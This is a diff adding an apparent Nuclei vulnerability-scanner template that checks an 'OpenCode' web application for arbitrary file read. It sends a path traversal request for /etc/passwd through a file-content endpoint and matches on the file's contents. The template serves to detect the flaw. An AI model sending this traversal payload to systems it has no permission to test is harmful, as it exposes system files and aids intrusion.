@@ -1,0 +1,24 @@
+id: OpenCode-anyfileread
+
+info:
+  name: OpenCode-anyfileread
+  author: OpenCode
+  severity: medium
+  tags: opencode
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/file/content?path=../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
+          - '/bin/bash'
+        condition: and
+      - type: status
+        status: 
+          - 200
